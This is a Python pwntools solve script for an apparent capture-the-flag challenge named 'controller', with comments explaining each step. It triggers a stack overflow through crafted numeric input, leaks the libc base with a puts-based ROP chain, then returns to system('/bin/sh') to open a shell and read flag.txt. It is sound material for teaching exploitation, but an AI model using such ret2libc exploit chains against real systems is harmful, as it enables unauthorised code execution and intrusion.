from pwn import *

# ANCHOR: loading
elf = ELF("controller")
elf_rop = ROP(elf)
libc = ELF("libc.so.6")
# ANCHOR_END: loading

conn = remote(MACHINE_IP, MACHINE_PORT)

# ANCHOR: fn_prepare_overflow
def prepare_overflow():
    conn.recvuntil("Insert the amount of 2 different types of recources: ")

    # Choose the two magic numbers
    conn.sendline("-32669 -2")
    conn.recvuntil("> ")

    # Choose to do a multiplication
    conn.sendline("3")
    conn.recvuntil("> ")
# ANCHOR_END: fn_prepare_overflow

# ANCHOR: offset_overflow
offset_overflow = b"A" * (0x28)
# ANCHOR_END: offset_overflow

# ANCHOR: fn_retrieve_libc_base
def retrieve_libc_base():
    with log.progress("retrieving libc base") as progress:
        # The payload will consists of the beginning garbage bytes then we will
        # leak the value of the `puts` function on the global offset table.
        # To do this we'll to load the address from where to print in the `rdi`
        # register (which is the first argument) so we use a gadget that will
        # pop the next value from the stack.
        progress.status("forging rop")
        rop = offset_overflow
        rop += p64(elf_rop.find_gadget(['pop rdi', 'ret']).address)
        rop += p64(elf.got["puts"])

        # Then once the value we want is loaded into `rdi` we can return to the
        # puts function to print the value.
        rop += p64(elf.plt["puts"])

        # Finally we return to main to continue the execution with a known libc
        # address.
        rop += p64(elf.symbols["main"])

        progress.status("waiting for overflow preparation")
        prepare_overflow()

        progress.status("sending overflow")
        conn.sendline(rop)
        conn.recvline()

        # Now we retrieve the bytes that were written with `puts`.
        # We then remove the offset of the `puts` symbol inside the libc and we
        # now know the libc base address.
        progress.status("calculating libc base address")
        leak = conn.recvline().strip()
        leak = u64(leak.ljust(8, b"\x00"))
        libc.address = leak - libc.symbols["puts"]
# ANCHOR_END: fn_retrieve_libc_base

# ANCHOR: fn_retrieve_shell
def retrieve_shell():
    with log.progress("retrieving a shell") as progress:
        # This time the rop will consist of a similar thing, loading the address
        # of the "/bin/sh" string into the `rdi` register.
        # We can search for this string inside the libc.
        progress.status("forging rop")
        rop = offset_overflow
        rop += p64(elf_rop.find_gadget(['ret']))
        rop += p64(elf_rop.find_gadget(['pop rdi', 'ret']).address)
        rop += p64(next(libc.search(b"/bin/sh")))

        # Now that the command is loaded, we continue by returning to the
        # `system` function.
        rop += p64(libc.sym["system"])

        # And finally we gracefully exit.
        rop += p64(libc.sym["exit"])

        progress.status("waiting for overflow preparation")
        prepare_overflow()

        progress.status("sending overflow")
        conn.sendline(rop)
        conn.recvline()
# ANCHOR_END: fn_retrieve_shell

# ANCHOR: cat_flag
retrieve_libc_base()
retrieve_shell()
conn.sendline("cat flag.txt")
log.success(conn.recvlineS())
# ANCHOR_END: cat_flag
